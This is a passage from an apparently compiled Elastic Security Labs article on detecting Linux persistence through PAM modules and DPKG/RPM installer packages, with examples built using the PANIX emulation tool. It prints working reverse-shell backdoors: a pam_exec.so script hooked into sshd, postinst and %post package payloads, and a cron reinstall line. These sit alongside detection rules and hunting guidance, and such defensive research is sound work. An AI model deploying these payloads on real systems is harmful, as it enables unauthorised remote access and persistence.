persistence\"})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,n.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml\",rel:\"nofollow\",children:\"Creation or Modification of Pluggable Authentication Module or Configuration\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation_in_unusual_dir.toml\",rel:\"nofollow\",children:\"Pluggable Authentication Module Creation in Unusual Directory\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/discovery_pam_version_discovery.toml\",rel:\"nofollow\",children:\"Pluggable Authentication Module Version Discovery\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_source_download.toml\",rel:\"nofollow\",children:\"Pluggable Authentication Module Source Download\"})]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Authentication\"}),(0,n.jsx)(e.td,{align:\"left\",children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_unusual_pam_grantor.toml\",rel:\"nofollow\",children:\"Authentication via Unusual PAM Grantor\"})})]})]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"To revert any changes made to the system by PANIX, you can use the corresponding revert module by running:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u003e ./panix.sh --revert pam\n\n[+] Searching for rogue PAM module\n[+] Restored original PAM module '/lib/x86_64-linux-gnu/security/pam_unix.so'.\n[+] Restarting SSH service...\n[+] SSH service restarted successfully.\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"hunting-for-t1556003---pluggable-authentication-modules-malicious-pam\",children:\"Hunting for T1556.003 - Pluggable Authentication Modules (Malicious PAM)\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the \\u201C\",(0,n.jsx)(e.em,{children:\"Hunting for T1053 - scheduled task/job\"}),\"\\u201D section of \\u201C\",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"Linux Detection Engineering -  A primer on persistence mechanisms\"})}),\"\\u201D. Additionally, descriptions and references can be found in our \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"Detection Rules repository\"}),\", specifically in the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/hunting\",rel:\"nofollow\",children:\"Linux hunting subdirectory\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can hunt for PAM persistence through \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html\",rel:\"nofollow\",children:\"ES|QL\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/kibana/current/osquery.html\",rel:\"nofollow\",children:\"OSQuery\"}),\", focusing on file creations (as this technique requires the compilation of modified PAM components) and modifications to PAM-related files and directories. The approach includes monitoring for the following:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Creations and/or modifications to PAM configuration files:\"}),\" Tracks changes to files in the \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/lib/security/\"}),\" directories and the \",(0,n.jsx)(e.code,{children:\"/etc/pam.conf\"}),\" file, which are commonly targeted for PAM persistence.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md\",rel:\"nofollow\",children:\"Persistence via Pluggable Authentication Modules\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1556/003/\",rel:\"nofollow\",children:\"T1556.003\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1556003---pluggable-authentication-modules-pam_execso\",children:\"T1556.003 - Pluggable Authentication Modules: pam_exec.so\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"pam_exec.so\"}),\" module, part of the PAM framework, allows administrators to execute external commands or scripts during the authentication process. This flexibility is powerful for extending authentication workflows with tasks like logging, additional security checks, or notifications. However, this same capability can be exploited by attackers to log passwords or execute backdoors, enabling malicious scripts to run when users authenticate.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"To understand how \",(0,n.jsx)(e.code,{children:\"pam_exec.so\"}),\" can be configured, consider the following excerpt from \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/common-auth\"}),\", a file that defines the authentication scheme for Linux systems:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-py\",children:`# /etc/pam.d/common-auth - authentication settings common to all services\n\n# Primary modules\nauth [success=1 default=ignore] pam_unix.so nullok_secure\n\n# Fallback if no module succeeds\nauth requisite pam_deny.so\n\n# Ensure a positive return value if none is set\nauth required pam_permit.so\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"This file controls how authentication is processed for all services. Each line defines a module and its behavior. For instance:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"auth\"}),\" keyword indicates that the module operates during the authentication phase.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Control flags, like \",(0,n.jsx)(e.code,{children:\"[success=1 default=ignore]\"}),\", specify how PAM interprets the module's result. For example, \",(0,n.jsx)(e.code,{children:\"success=1\"}),\" skips the next module if the current one succeeds.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"requisite\"}),\" flag immediately denies authentication if the module fails:\",`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"auth requisite pam_deny.so\"})}),`\n`]}),`\n`]}),`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"required\"}),\" flag ensures the module must succeed for authentication to proceed, though subsequent modules in the stack will still execute:\",`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"auth required pam_permit.so\"})}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Modules such as \",(0,n.jsx)(e.code,{children:\"pam_unix.so\"}),\" handle traditional UNIX authentication by validating user credentials against \",(0,n.jsx)(e.code,{children:\"/etc/shadow\"}),\". Together, these components define the authentication process and dictate how the system responds to various conditions. For more information and examples, visit the \",(0,n.jsx)(e.a,{href:\"https://linux.die.net/man/5/pam.d\",rel:\"nofollow\",children:\"pam.d man page\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"One way of abusing this mechanism is by leveraging the \",(0,n.jsx)(e.code,{children:\"pam_exec.so\"}),\" module to execute an arbitrary script upon authentication through \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/sshd\"}),\". By providing the path to a backdoor script on the host system, we can ensure that our backdoor is executed on every successful SSH authentication. \",(0,n.jsx)(e.a,{href:\"https://www.group-ib.com/\",rel:\"nofollow\",children:\"Group-IB\"}),\" wrote about this technique in a recent publication dubbed \\u201C\",(0,n.jsx)(e.a,{href:\"https://www.group-ib.com/blog/pluggable-authentication-module/\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"The Duality of the Pluggable Authentication Module (PAM)\"})}),\"\\u201D.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"A second method involves the modification of \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/common-auth\"}),\" for Debian-based systems or \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/sshd\"}),\" for Fedora-based systems to log user credentials. This technique was earlier discussed in \",(0,n.jsx)(e.a,{href:\"https://embracethered.com/blog/\",rel:\"nofollow\",children:\"Wunderwuzzi\\u2019s blog\"}),\" called \\u201C\",(0,n.jsx)(e.a,{href:\"https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/\",rel:\"nofollow\",children:(0,n.jsx)(e.em,{children:\"Post Exploitation: Sniffing Logon Passwords with PAM\"})}),\"\\u201D. While capturing credentials isn't technically a persistence mechanism, it enables ongoing access to a host by leveraging stolen credentials.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"In the next section we will take a look at how to implement arbitrary command execution through \",(0,n.jsx)(e.code,{children:\"pam_exec.so\"}),\" using PANIX.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"persistence-through-t1556003---pluggable-authentication-modules-pam_execso\",children:\"Persistence through T1556.003 - Pluggable Authentication Modules: pam_exec.so\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"To better understand the technique, we will take a look at the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh\",rel:\"nofollow\",children:\"setup_pam.sh\"}),\" PANIX module.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`echo -e \"#!/bin/bash\\\\nnohup setsid /bin/bash -c '/bin/bash -i \u003e\u0026 /dev/tcp/$ip/$port 0\u003e\u00261' \u0026\" \u003e /bin/pam_exec_backdoor.sh\n\nchmod 700 /bin/pam_exec_backdoor.sh\n\npam_sshd_file=\"/etc/pam.d/sshd\"\npam_line=\"session optional pam_exec.so seteuid /bin/pam_exec_backdoor.sh\"\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The first step is to create the backdoor script to execute, this can be any C2 beacon, reverse shell or other means of persistence. PANIX creates a simple reverse shell and grants it execution permissions. Once the backdoor in \",(0,n.jsx)(e.code,{children:\"/bin/pam_exec_backdoor.sh\"}),\" is in place, the \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/sshd\"}),\" file is modified. The \",(0,n.jsx)(e.code,{children:\"session\"}),\" keyword ensures the script runs during user session setup or teardown, while \",(0,n.jsx)(e.code,{children:\"seteuid\"}),\" ensures the script runs with the effective user ID (\",(0,n.jsx)(e.code,{children:\"eUID\"}),\") of the authenticated user instead of root.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Since the detection methods for the password harvesting module are quite similar to those of the backdoor module, we will focus on discussing the backdoor module in detail. You are encouraged to explore the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7a9cf39b35b40ee64bfe6b510f685003ebc043ae/modules/setup_pam.sh#L257\",rel:\"nofollow\",children:\"password-harvesting module\"}),\" on your own!\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s run the PANIX module with the following command line arguments:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u003e sudo ./panix.sh --pam --pam-exec --backdoor --ip 192.168.100.1 --port 2015\n\n[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh...\n[+] /bin/pam_exec_backdoor.sh created and permissions set to 700.\n[+] Modifying /etc/pam.d/sshd to include the PAM_EXEC rule...\n[+] PAM_EXEC rule added to /etc/pam.d/sshd.\n[+] Restarting SSH service to apply changes...\n[+] SSH service restarted successfully.\n[+] PAM_EXEC reverse shell backdoor planted!\n\nAuthenticate to trigger the reverse shell.\n\n[+] PAM persistence established!\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After triggering the reverse shell by authentication, we can analyze the logs in Discover:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image3.png\",alt:\"PANIX pam_exec.so module execution visualized in Kibana\",width:\"1639\",height:\"1350\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After PANIX executes, it creates and grants execution permissions to the \",(0,n.jsx)(e.code,{children:\"/bin/pam_exec_backdoor.sh\"}),\" backdoor. Next, the backdoor configuration is added to the \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/sshd\"}),\" file, and the \",(0,n.jsx)(e.code,{children:\"SSHD\"}),\" service is restarted. Upon authentication, we can see the execution of the backdoor by the \",(0,n.jsx)(e.code,{children:\"SSHD\"}),\" parent process, starting the reverse shell chain (\",(0,n.jsx)(e.code,{children:\"pam_exec_backdoor.sh\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"bash\"}),\").\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s review the coverage. The key distinction between this technique and the previous one is that this method relies on configuration changes rather than compiling a new PAM module, requiring a different set of detection rules to address the threat effectively:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover pam_exec.so persistence\"})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,n.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml\",rel:\"nofollow\",children:\"Creation or Modification of Pluggable Authentication Module or Configuration\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,n.jsxs)(e.td,{align:\"left\",children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/8a9e857453566068088f5a24cc1f39b839e60fe8/behavior/rules/linux/persistence_potential_backdoor_execution_through_pam_exec.toml\",rel:\"nofollow\",children:\"Potential Backdoor Execution Through PAM_EXEC\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/e528feb989d8fc7f7ca8c4100c0bf5ca7b912a5d/rules/linux/persistence_unusual_sshd_child_process.toml\",rel:\"nofollow\",children:\"Unusual SSHD Child Process\"})]})]})]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"To revert any changes, you can use the corresponding revert module by running:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`\u003e ./panix.sh --revert pam\n\n[+] Removing PAM_EXEC backdoor...\n[+] Removed '/bin/pam_exec_backdoor.sh'.\n[+] Removed PAM_EXEC line from '/etc/pam.d/sshd'.\n[+] Restarting SSH service...\n[+] SSH service restarted successfully.\n[-] PAM_EXEC line not found in '/etc/pam.d/common-auth'.\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"hunting-for-t1556003---pluggable-authentication-modules-pam_execso\",children:\"Hunting for T1556.003 - Pluggable Authentication Modules: pam_exec.so\"}),`\n`,(0,n.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to its use. This technique relies on altering PAM configuration files, rather than compilation to execute commands or scripts. The approach includes monitoring for the following:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Child processes spawned from SSH:\"}),\" Tracks processes initiated via SSH sessions, as these may indicate the misuse of \",(0,n.jsx)(e.code,{children:\"pam_exec.so\"}),\" for persistence.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Creations and/or modifications to PAM configuration files:\"}),\" Tracks changes to files in the \",(0,n.jsx)(e.code,{children:\"/etc/pam.d/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/lib/security/\"}),\" directories and the \",(0,n.jsx)(e.code,{children:\"/etc/pam.conf\"}),\" file, which are commonly targeted for PAM persistence.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md\",rel:\"nofollow\",children:\"Persistence via Pluggable Authentication Modules\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1556/003/\",rel:\"nofollow\",children:\"T1556.003\"}),\".\"]}),`\n`,(0,n.jsx)(e.h1,{id:\"t1546016---event-triggered-execution-installer-packages\",children:\"T1546.016 - Event Triggered Execution: Installer Packages\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Package managers are used to install, update, and manage software packages. While these tools streamline software management, they can also be abused by attackers to gain initial access or achieve persistence. By hijacking the package manager's execution flow, attackers can insert malicious code that executes during routine package management tasks, such as package installation or updates. This technique is tracked by MITRE under the identifier \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/016/\",rel:\"nofollow\",children:\"T1546.016\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1546016---installer-packages-dpkg--rpm\",children:\"T1546.016 - Installer Packages: DPKG \u0026 RPM\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Popular managers include \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\" (Debian Package) for Debian-based distributions and \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" (Red Hat Package Manager) for Red Hat-based systems.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"1. DPKG (Debian Package Manager)\"})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"DPKG\"}),\", the Debian package manager, processes \",(0,n.jsx)(e.code,{children:\".deb\"}),\" packages and supports lifecycle scripts such as \",(0,n.jsx)(e.code,{children:\"preinst\"}),\", \",(0,n.jsx)(e.code,{children:\"postinst\"}),\", \",(0,n.jsx)(e.code,{children:\"prerm\"}),\", and \",(0,n.jsx)(e.code,{children:\"postrm\"}),\". These scripts run at different stages of the package lifecycle, making them a potential target for executing malicious commands. A potential DPKG package file structure used for malicious intent could look like this:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`malicious_package/\\v\\u251C\\u2500\\u2500 DEBIAN/\n    \\u251C\\u2500\\u2500 control\n    \\u251C\\u2500\\u2500 postinst\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Where the post-installation script (\",(0,n.jsx)(e.code,{children:\"postinst\"}),\") runs immediately after a package is installed, allowing the attacker to gain initial access or establish persistence through malicious code.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon installation, the \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\" scripts (\",(0,n.jsx)(e.code,{children:\"preinst\"}),\", \",(0,n.jsx)(e.code,{children:\"postinst\"}),\", \",(0,n.jsx)(e.code,{children:\"prerm\"}),\", and \",(0,n.jsx)(e.code,{children:\"postrm\"}),\") will be stored in the \",(0,n.jsx)(e.code,{children:\"/var/lib/dpkg/info/\"}),\" directory and executed. Package installation logs are stored in \",(0,n.jsx)(e.code,{children:\"/var/log/dpkg.log\"}),\", and record commands like \",(0,n.jsx)(e.code,{children:\"dpkg -i\"}),\" and the package names.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"2. RPM (Red Hat Package Manager)\"})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"RPM\"}),\", the Red Hat Package Manager, is the default package manager for Red Hat-based distributions like Fedora, CentOS, and RHEL. It processes \",(0,n.jsx)(e.code,{children:\".rpm\"}),\" packages and supports script sections such as \",(0,n.jsx)(e.code,{children:\"%pre\"}),\", \",(0,n.jsx)(e.code,{children:\"%post\"}),\", \",(0,n.jsx)(e.code,{children:\"%preun\"}),\", and \",(0,n.jsx)(e.code,{children:\"%postun\"}),\", which execute at various stages of the package lifecycle. These scripts can be exploited by attackers to run arbitrary commands during installation, removal, or updates.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"A typical malicious RPM package might include a \",(0,n.jsx)(e.code,{children:\"%post\"}),\" script embedded directly in the package\\u2019s \",(0,n.jsx)(e.code,{children:\"spec\"}),\" file. For example, a \",(0,n.jsx)(e.code,{children:\"%post\"}),\" script could launch a reverse shell or modify critical system configurations immediately after the package installation completes. An example package layout could look as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`~/rpmbuild/\n\\u251C\\u2500\\u2500 SPECS/\n\\u2502    \\u251C\\u2500\\u2500 malicious_package.spec\n\\u251C\\u2500\\u2500 BUILD/\n\\u251C\\u2500\\u2500 RPMS/\n\\u251C\\u2500\\u2500 SOURCES/\n\\u251C\\u2500\\u2500 SRPMS/\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon installation, \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" runs the \",(0,n.jsx)(e.code,{children:\"%post\"}),\" script, allowing the attacker to execute the payload. The package manager logs installation activity in \",(0,n.jsx)(e.code,{children:\"/var/log/rpm.log\"}),\", which includes the names and timestamps of installed packages. Additionally, the built \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" package is stored in \",(0,n.jsx)(e.code,{children:\"/var/lib/rpm/\"}),\".\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"persistence-through-t1546016---installer-packages-dpkg--rpm\",children:\"Persistence through T1546.016 - Installer Packages: DPKG \u0026 RPM\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"PANIX can establish persistence through both \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\" and \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" within the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_package.sh\",rel:\"nofollow\",children:\"setup_malicious_package.sh\"}),\" module. Starting with \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\", the directory structure is created, the control file is written and the payload is added to the \",(0,n.jsx)(e.code,{children:\"postinst\"}),\" file:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`# DPKG package setup\nPACKAGE_NAME=\"panix\"\nPACKAGE_VERSION=\"1.0\"\nDEB_DIR=\"\\${PACKAGE_NAME}/DEBIAN\"\nPAYLOAD=\"#!/bin/sh\\\\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/\\${ip}/\\${port} 0\u003e\u00261' \u0026\"\n\n# Create directory structure\nmkdir -p \\${DEB_DIR}\n\n# Write postinst script\necho -e \"\\${PAYLOAD}\" \u003e \\${DEB_DIR}/postinst\nchmod +x \\${DEB_DIR}/postinst\n\n# Write control file\necho \"Package: \\${PACKAGE_NAME}\" \u003e \\${DEB_DIR}/control\necho \"Version: \\${PACKAGE_VERSION}\" \u003e\u003e \\${DEB_DIR}/control\necho \"Architecture: all\" \u003e\u003e \\${DEB_DIR}/control\necho \"Maintainer: https://github.com/Aegrah/PANIX\" \u003e\u003e \\${DEB_DIR}/control\necho \"Description: This malicious package was added through PANIX\" \u003e\u003e \\${DEB_DIR}/control\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Afterwards, all that is left is to build the package with \",(0,n.jsx)(e.code,{children:\"dpkg-deb\"}),\" and install it through \",(0,n.jsx)(e.code,{children:\"dpkg\"}),\".\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`# Build the .deb package\ndpkg-deb --build \\${PACKAGE_NAME}\n\n# Install the .deb package\ndpkg -i \\${PACKAGE_NAME}.deb\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon installation, or updating of the package, the payload will be executed. In order to persist on a regular interval, any other persistence mechanism can be used. PANIX leverages \",(0,n.jsx)(e.code,{children:\"Cron\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.code,{children:'echo \"*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure \u003e /dev/null 2\u003e\u00261\" | crontab -'})}),`\n`,(0,n.jsx)(e.p,{children:\"To forcefully install the package on a certain interval. This is of course not a stealthy mechanism, but serves as a proof of concept to emulate the technique. Let\\u2019s run the payload, and analyze the simulated events in Kibana:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`sudo ./panix.sh --malicious-package --dpkg --ip 192.168.100.1 --port 2019\ndpkg-deb: building package 'panix' in 'panix.deb'.\nPreparing to unpack panix.deb ...\nUnpacking panix (1.0) over (1.0) ...\nSetting up panix (1.0) ...\nnohup: appending output to 'nohup.out'\n[+] Malicious package persistence established.\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Looking at the events generated in Kibana, we can see the following sequence:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/approaching-the-summit-on-persistence/image2.png\",alt:\"PANIX malicious-package module execution visualized in Kibana (DPKG)\",width:\"1463\",height:\"823\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"PANIX is executed via \",(0,n.jsx)(e.code,{children:\"sudo\"}),\", after which the \",(0,n.jsx)(e.code,{children:\"postinst\"}),\" and \",(0,n.jsx)(e.code,{children:\"control\"}),\" files are created. The package is then built using \",(0,n.jsx)(e.code,{children:\"dpkg-deb\"}),\", and installed with \",(0,n.jsx)(e.code,{children:\"dpkg -i\"}),\". Here we can see the \",(0,n.jsx)(e.code,{children:\"/var/lib/dpkg/info/panix.postinst\"}),\" executing the reverse shell execution chain (\",(0,n.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,n.jsx)(e.code,{children:\"bash\"}),\"). After installation, the \",(0,n.jsx)(e.code,{children:\"crontab\"}),\" is altered to establish persistence on a one-minute interval.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"RPM\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For \",(0,n.jsx)(e.code,{children:\"RPM\"}),\", a similar flow as \",(0,n.jsx)(e.code,{children:\"DPKG\"}),\" is leveraged. The package is set up using the correct \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" package structure, and the \",(0,n.jsx)(e.code,{children:\"%post\"}),\" section is set to contain the payload that gets triggered after installation:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`# RPM package setup\nPACKAGE_NAME=\"panix\"\nPACKAGE_VERSION=\"1.0\"\ncat \u003c\u003c-EOF \u003e ~/rpmbuild/SPECS/\\${PACKAGE_NAME}.spec\nName: \\${PACKAGE_NAME}\nVersion: \\${PACKAGE_VERSION}\nRelease: 1%{?dist}\nSummary: RPM package with payload script\nLicense: MIT\n\n%description\nRPM package with a payload script that executes a reverse shell.\n\n%prep\n# No need to perform any preparation actions\n\n%install\n# Create directories\nmkdir -p %{buildroot}/usr/bin\n\n%files\n# No need to specify any files here since the payload is embedded\n\n%post\n# Trigger payload after installation\nnohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/\\${ip}/\\${port} 0\u003e\u00261' \u0026\n\n%clean\nrm -rf %{buildroot}\n\n%changelog\n* $(date +'%a %b %d %Y') John Doe \u003cjohn.doe@example.com\u003e 1.0-1\n- Initial package creation\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Next, the \",(0,n.jsx)(e.code,{children:\"RPM\"}),\" package is built using \",(0,n.jsx)(e.code,{children:\"rpmbuild\"}),\", and installed with \",(0,n.jsx)(e.code,{children:\"rpm\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`# Build RPM package\nrpmbuild -bb 